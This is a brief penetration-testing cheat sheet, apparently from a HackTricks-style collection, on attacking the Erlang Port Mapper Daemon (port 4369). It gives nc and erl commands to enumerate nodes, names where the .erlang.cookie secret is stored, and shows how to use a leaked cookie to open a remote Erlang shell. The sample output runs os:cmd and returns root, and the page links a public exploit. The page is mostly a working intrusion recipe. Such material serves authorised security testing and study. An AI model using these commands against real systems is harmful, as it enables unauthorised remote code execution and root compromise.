# 4369 - Erlang

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd" %}

{% code overflow="wrap" %}
```bash
# enum ports and nodes manually
echo -n -e "\x00\x01\x6e" | nc -vn <IP> 4369

# Via Erlang
apt install erlang
erl # Once Erlang is installed this will promp an erlang terminal
1> net_adm:names('<HOST>'). # This will return the listen addresses

# Get RCE with cookie
# Cookie location is ~/.erlang.cookie or /var/lib/rabbitmq/.erlang.cookie
# target.fqdn is IP, test is node name extracted before
$ erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn 
Erlang/OTP 19 [erts-8.1] [source] [64-bit] [async-threads:10]
Eshell V8.1 (abort with ^G)

# At last, we can start an erlang shell on the remote system.

(test@target.fqdn)1>os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"

# If manual way with cookie does not work try https://www.exploit-db.com/exploits/49418
```
{% endcode %}
